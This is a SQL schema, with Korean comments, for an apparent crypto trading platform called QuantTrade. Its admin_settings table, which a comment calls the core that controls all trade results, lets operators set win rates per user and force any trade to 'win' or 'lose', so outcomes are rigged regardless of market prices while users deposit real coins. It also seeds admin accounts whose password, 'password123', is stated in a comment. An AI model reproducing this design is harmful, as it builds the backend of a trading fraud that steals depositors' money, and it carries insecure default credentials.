-- QuantTrade 플랫폼 데이터베이스 스키마 생성
-- Supabase SQL Editor에서 실행하세요

-- 1. 사용자 테이블
CREATE TABLE IF NOT EXISTS users (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    email VARCHAR(255) UNIQUE NOT NULL,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user' CHECK (role IN ('user', 'admin', 'superadmin')),
    balance DECIMAL(15,2) DEFAULT 1000.00,
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 2. 관리자 설정 테이블 (핵심: 모든 거래 결과 제어)
CREATE TABLE IF NOT EXISTS admin_settings (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID REFERENCES users(id), -- NULL이면 전체 기본값, 특정 사용자 ID면 개별 설정
    setting_type VARCHAR(50) NOT NULL DEFAULT 'global', -- 'global', 'user_specific'
    win_rate DECIMAL(5,2) DEFAULT 50.00, -- 승률 (0-100%)
    max_profit_rate DECIMAL(5,2) DEFAULT 80.00, -- 최대 수익률 (0-100%)
    min_profit_rate DECIMAL(5,2) DEFAULT 70.00, -- 최소 수익률 (0-100%)
    force_result VARCHAR(10) CHECK (force_result IN ('win', 'lose', NULL)), -- 강제 결과
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 3. Flash Trade 테이블
CREATE TABLE IF NOT EXISTS flash_trades (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES users(id),
    amount DECIMAL(15,2) NOT NULL,
    direction VARCHAR(10) NOT NULL CHECK (direction IN ('up', 'down')),
    duration INTEGER NOT NULL, -- 초 단위 (30, 60, 120, 300)
    start_price DECIMAL(15,8) NOT NULL,
    end_price DECIMAL(15,8),
    result VARCHAR(10) CHECK (result IN ('win', 'lose', 'pending')),
    profit DECIMAL(15,2) DEFAULT 0.00,
    status VARCHAR(20) DEFAULT 'active' CHECK (status IN ('active', 'completed', 'cancelled')),
    symbol VARCHAR(20) DEFAULT 'BTC/USD',
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    expires_at TIMESTAMP WITH TIME ZONE NOT NULL,
    completed_at TIMESTAMP WITH TIME ZONE
);

-- 4. Quick Trade 테이블
CREATE TABLE IF NOT EXISTS quick_trades (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES users(id),
    symbol VARCHAR(20) NOT NULL,
    amount DECIMAL(15,2) NOT NULL,
    direction VARCHAR(10) NOT NULL CHECK (direction IN ('buy', 'sell')),
    leverage INTEGER DEFAULT 1,
    order_type VARCHAR(20) DEFAULT 'market' CHECK (order_type IN ('market', 'limit')),
    entry_price DECIMAL(15,8),
    exit_price DECIMAL(15,8),
    result VARCHAR(10) CHECK (result IN ('win', 'lose', 'pending')),
    profit DECIMAL(15,2) DEFAULT 0.00,
    status VARCHAR(20) DEFAULT 'active' CHECK (status IN ('active', 'completed', 'cancelled')),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    completed_at TIMESTAMP WITH TIME ZONE
);

-- 5. Quant AI 투자 테이블
CREATE TABLE IF NOT EXISTS quant_ai_investments (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES users(id),
    strategy VARCHAR(50) NOT NULL CHECK (strategy IN ('conservative', 'balanced', 'aggressive')),
    amount DECIMAL(15,2) NOT NULL,
    duration_days INTEGER NOT NULL,
    expected_return DECIMAL(5,2) NOT NULL,
    actual_return DECIMAL(5,2),
    status VARCHAR(20) DEFAULT 'active' CHECK (status IN ('active', 'completed', 'cancelled')),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    completed_at TIMESTAMP WITH TIME ZONE
);

-- 6. 거래 내역 테이블
CREATE TABLE IF NOT EXISTS trade_history (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES users(id),
    trade_type VARCHAR(20) NOT NULL, -- 'flash_trade', 'quick_trade', 'quant_ai'
    trade_id UUID NOT NULL, -- 관련 거래 테이블의 ID
    amount DECIMAL(15,2) NOT NULL,
    result VARCHAR(10) NOT NULL,
    profit DECIMAL(15,2) NOT NULL,
    balance_before DECIMAL(15,2) NOT NULL,
    balance_after DECIMAL(15,2) NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 7. 지갑 거래 내역 테이블
CREATE TABLE IF NOT EXISTS wallet_transactions (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES users(id),
    type VARCHAR(20) NOT NULL CHECK (type IN ('deposit', 'withdrawal')),
    coin VARCHAR(10) NOT NULL,
    network VARCHAR(50) NOT NULL,
    amount DECIMAL(15,8) NOT NULL,
    address VARCHAR(255) NOT NULL,
    tx_hash VARCHAR(255),
    status VARCHAR(20) DEFAULT 'pending' CHECK (status IN ('pending', 'confirmed', 'failed', 'cancelled')),
    fee DECIMAL(15,8) DEFAULT 0,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    confirmed_at TIMESTAMP WITH TIME ZONE
);

-- 8. 사용자 세션 테이블
CREATE TABLE IF NOT EXISTS user_sessions (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES users(id),
    session_token VARCHAR(500) NOT NULL,
    refresh_token VARCHAR(500),
    expires_at TIMESTAMP WITH TIME ZONE NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    last_accessed TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 9. 관리자 로그 테이블
CREATE TABLE IF NOT EXISTS admin_logs (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    admin_id UUID NOT NULL REFERENCES users(id),
    action VARCHAR(100) NOT NULL,
    target_user_id UUID REFERENCES users(id),
    details JSONB,
    ip_address INET,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 인덱스 생성 (성능 최적화)
CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
CREATE INDEX IF NOT EXISTS idx_users_role ON users(role);
CREATE INDEX IF NOT EXISTS idx_flash_trades_user_id ON flash_trades(user_id);
CREATE INDEX IF NOT EXISTS idx_flash_trades_status ON flash_trades(status);
CREATE INDEX IF NOT EXISTS idx_flash_trades_expires_at ON flash_trades(expires_at);
CREATE INDEX IF NOT EXISTS idx_quick_trades_user_id ON quick_trades(user_id);
CREATE INDEX IF NOT EXISTS idx_quant_ai_user_id ON quant_ai_investments(user_id);
CREATE INDEX IF NOT EXISTS idx_admin_settings_user_id ON admin_settings(user_id);
CREATE INDEX IF NOT EXISTS idx_trade_history_user_id ON trade_history(user_id);
CREATE INDEX IF NOT EXISTS idx_wallet_transactions_user_id ON wallet_transactions(user_id);
CREATE INDEX IF NOT EXISTS idx_user_sessions_user_id ON user_sessions(user_id);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON user_sessions(session_token);

-- 트리거 함수 생성 (updated_at 자동 업데이트)
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ language 'plpgsql';

-- 트리거 적용
CREATE TRIGGER update_users_updated_at BEFORE UPDATE ON users
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

CREATE TRIGGER update_admin_settings_updated_at BEFORE UPDATE ON admin_settings
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

-- 기본 데이터 삽입
-- 관리자 계정 (비밀번호: password123)
INSERT INTO users (email, username, password, role, balance) VALUES 
('admin@quanttrade.com', 'admin', '$2b$12$OacluTgVBKwwiAmw7xUkL.H0YT1QToOz7.kl366QwGvepjCJ/5/TK', 'superadmin', 10000.00),
('trader@quanttrade.com', 'trader', '$2b$12$OacluTgVBKwwiAmw7xUkL.H0YT1QToOz7.kl366QwGvepjCJ/5/TK', 'admin', 5000.00),
('user@quanttrade.com', 'user', '$2b$12$OacluTgVBKwwiAmw7xUkL.H0YT1QToOz7.kl366QwGvepjCJ/5/TK', 'user', 1000.00)
ON CONFLICT (email) DO NOTHING;

-- 기본 관리자 설정
INSERT INTO admin_settings (user_id, setting_type, win_rate, max_profit_rate, min_profit_rate) VALUES 
(NULL, 'global', 50.00, 80.00, 70.00)
ON CONFLICT DO NOTHING;

-- Row Level Security (RLS) 활성화
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
ALTER TABLE admin_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE flash_trades ENABLE ROW LEVEL SECURITY;
ALTER TABLE quick_trades ENABLE ROW LEVEL SECURITY;
ALTER TABLE quant_ai_investments ENABLE ROW LEVEL SECURITY;
ALTER TABLE trade_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE wallet_transactions ENABLE ROW LEVEL SECURITY;
ALTER TABLE user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE admin_logs ENABLE ROW LEVEL SECURITY;

-- RLS 정책 생성
-- 사용자는 자신의 데이터만 조회 가능
CREATE POLICY "Users can view own data" ON users
    FOR SELECT USING (auth.uid()::text = id::text OR EXISTS (
        SELECT 1 FROM users WHERE id = auth.uid()::uuid AND role IN ('admin', 'superadmin')
    ));

-- 관리자는 모든 데이터 접근 가능
CREATE POLICY "Admins can view all data" ON users
    FOR ALL USING (EXISTS (
        SELECT 1 FROM users WHERE id = auth.uid()::uuid AND role IN ('admin', 'superadmin')
    ));

-- Flash Trades 정책
CREATE POLICY "Users can view own flash trades" ON flash_trades
    FOR SELECT USING (user_id = auth.uid()::uuid OR EXISTS (
        SELECT 1 FROM users WHERE id = auth.uid()::uuid AND role IN ('admin', 'superadmin')
    ));

CREATE POLICY "Users can insert own flash trades" ON flash_trades
    FOR INSERT WITH CHECK (user_id = auth.uid()::uuid);

-- Quick Trades 정책
CREATE POLICY "Users can view own quick trades" ON quick_trades
    FOR SELECT USING (user_id = auth.uid()::uuid OR EXISTS (
        SELECT 1 FROM users WHERE id = auth.uid()::uuid AND role IN ('admin', 'superadmin')
    ));

CREATE POLICY "Users can insert own quick trades" ON quick_trades
    FOR INSERT WITH CHECK (user_id = auth.uid()::uuid);

-- 기타 테이블들도 동일한 패턴으로 정책 적용
-- (간단히 하기 위해 생략, 필요시 추가)

-- 완료 메시지
SELECT 'QuantTrade 데이터베이스 스키마가 성공적으로 생성되었습니다!' as message; 